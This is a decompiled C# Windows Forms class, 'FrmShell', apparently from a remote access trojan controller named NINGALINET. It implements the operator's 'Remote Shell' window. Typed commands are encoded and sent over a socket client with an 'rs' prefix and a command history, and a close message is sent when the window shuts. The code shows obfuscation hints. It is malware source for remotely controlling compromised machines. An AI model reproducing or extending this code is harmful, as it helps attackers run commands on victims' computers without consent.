using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;
using NINGALINET.My.Resources;

namespace NINGALINET
{
	// Token: 0x02000024 RID: 36
	[DesignerGenerated]
	public partial class FrmShell : Form
	{
		// Token: 0x06000724 RID: 1828 RVA: 0x000044A6 File Offset: 0x000026A6
		[DebuggerNonUserCode]
		static FrmShell()
		{
			// Note: this type is marked as 'beforefieldinit'.
			Class2.zP7eVJHzSiX6G();
			FrmShell.__ENCList = new List<WeakReference>();
		}

		// Token: 0x06000725 RID: 1829 RVA: 0x00039F7C File Offset: 0x0003817C
		[DebuggerNonUserCode]
		private static void __ENCAddToList(object value)
		{
			List<WeakReference> _ENCList = FrmShell.__ENCList;
			checked
			{
				lock (_ENCList)
				{
					if (FrmShell.__ENCList.Count == FrmShell.__ENCList.Capacity)
					{
						int num = 0;
						int arg_37_0 = 0;
						int num2 = FrmShell.__ENCList.Count - 1;
						int num3 = arg_37_0;
						while (true)
						{
							int arg_7D_0 = num3;
							int num4 = num2;
							if (arg_7D_0 > num4)
							{
								break;
							}
							WeakReference weakReference = FrmShell.__ENCList[num3];
							if (weakReference.IsAlive)
							{
								if (num3 != num)
								{
									FrmShell.__ENCList[num] = FrmShell.__ENCList[num3];
								}
								num++;
							}
							num3++;
						}
						FrmShell.__ENCList.RemoveRange(num, FrmShell.__ENCList.Count - num);
						FrmShell.__ENCList.Capacity = FrmShell.__ENCList.Count;
					}
					FrmShell.__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
				}
			}
		}

		// Token: 0x170002A2 RID: 674
		// (get) Token: 0x06000728 RID: 1832 RVA: 0x0003A294 File Offset: 0x00038494
		// (set) Token: 0x06000729 RID: 1833 RVA: 0x0003A2AC File Offset: 0x000384AC
		internal virtual TextBox T2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._T2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				KeyEventHandler value2 = new KeyEventHandler(this.T2_KeyDown);
				if (this._T2 != null)
				{
					this._T2.KeyDown -= value2;
				}
				this._T2 = value;
				if (this._T2 != null)
				{
					this._T2.KeyDown += value2;
				}
			}
		}

		// Token: 0x170002A3 RID: 675
		// (get) Token: 0x0600072A RID: 1834 RVA: 0x0003A304 File Offset: 0x00038504
		// (set) Token: 0x0600072B RID: 1835 RVA: 0x000044B7 File Offset: 0x000026B7
		internal virtual RichTextBox T1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._T1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._T1 = value;
			}
		}

		// Token: 0x170002A4 RID: 676
		// (get) Token: 0x0600072C RID: 1836 RVA: 0x0003A31C File Offset: 0x0003851C
		// (set) Token: 0x0600072D RID: 1837 RVA: 0x0003A334 File Offset: 0x00038534
		internal virtual Timer Timer1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Timer1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Timer1_Tick);
				if (this._Timer1 != null)
				{
					this._Timer1.Tick -= value2;
				}
				this._Timer1 = value;
				if (this._Timer1 != null)
				{
					this._Timer1.Tick += value2;
				}
			}
		}

		// Token: 0x0600072E RID: 1838 RVA: 0x0003A38C File Offset: 0x0003858C
		public FrmShell()
		{
			Class2.zP7eVJHzSiX6G();
			base..ctor();
			base.FormClosing += new FormClosingEventHandler(this.shl_FormClosing);
			base.Resize += new EventHandler(this.shl_Resize);
			base.Load += new EventHandler(this.shl_Load);
			FrmShell.__ENCAddToList(this);
			base.FormClosing += new FormClosingEventHandler(this.shl_FormClosing);
			base.Resize += new EventHandler(this.shl_Resize);
			base.Load += new EventHandler(this.shl_Load);
			this.A = new string[5];
			this.idx = 0;
			this.it = 0;
			this.InitializeComponent();
		}

		// Token: 0x0600072F RID: 1839 RVA: 0x000044C0 File Offset: 0x000026C0
		private void shl_FormClosing(object sender, FormClosingEventArgs e)
		{
			if (this.sk.CN)
			{
				this.sk.Send("rsc");
			}
			this.sk.CN = false;
		}

		// Token: 0x06000730 RID: 1840 RVA: 0x000044EC File Offset: 0x000026EC
		private void shl_Load(object sender, EventArgs e)
		{
			this.Text = "Remote Shell - " + Conversions.ToString(RuntimeHelpers.GetObjectValue(ima.vno(this.osk.L)));
			this.Timer1.Start();
		}

		// Token: 0x06000731 RID: 1841 RVA: 0x0003A43C File Offset: 0x0003863C
		private void Timer1_Tick(object sender, EventArgs e)
		{
			if (this.osk == null | this.sk == null)
			{
				this.Close();
			}
			if (!this.osk.CN | !this.sk.CN)
			{
				this.Close();
			}
		}

		// Token: 0x06000732 RID: 1842 RVA: 0x0003A48C File Offset: 0x0003868C
		private void T2_KeyDown(object sender, KeyEventArgs e)
		{
			Keys keyCode = e.KeyCode;
			checked
			{
				if (keyCode == Keys.Return)
				{
					string text = this.T2.Text;
					this.T2.Text = "";
					e.SuppressKeyPress = true;
					this.A[this.it] = text;
					this.it++;
					if (this.it > this.A.Length - 1)
					{
						this.it = 0;
					}
					this.sk.Send("rs" + ima.Y + Fungsi.ENB(ref text));
				}
				else if (keyCode == Keys.Down)
				{
					this.idx += -1;
					if (this.idx < 0)
					{
						this.idx = 0;
					}
					this.T2.Text = this.A[this.idx];
				}
				else if (keyCode == Keys.Up)
				{
					this.idx++;
					if (this.idx > this.A.Length - 1)
					{
						this.idx = this.A.Length - 1;
					}
					this.T2.Text = this.A[this.idx];
				}
			}
		}

		// Token: 0x06000733 RID: 1843 RVA: 0x00004523 File Offset: 0x00002723
		private void shl_Resize(object sender, EventArgs e)
		{
			this.T1.ScrollToCaret();
		}

		// Token: 0x0400034D RID: 845
		private static List<WeakReference> __ENCList;

		// Token: 0x0400034F RID: 847
		[AccessedThroughProperty("T2")]
		private TextBox _T2;

		// Token: 0x04000350 RID: 848
		[AccessedThroughProperty("T1")]
		private RichTextBox _T1;

		// Token: 0x04000351 RID: 849
		[AccessedThroughProperty("Timer1")]
		private Timer _Timer1;

		// Token: 0x04000352 RID: 850
		private string[] A;

		// Token: 0x04000353 RID: 851
		private int idx;

		// Token: 0x04000354 RID: 852
		private int it;

		// Token: 0x04000355 RID: 853
		public Client sk;

		// Token: 0x04000356 RID: 854
		public Client osk;
	}
}
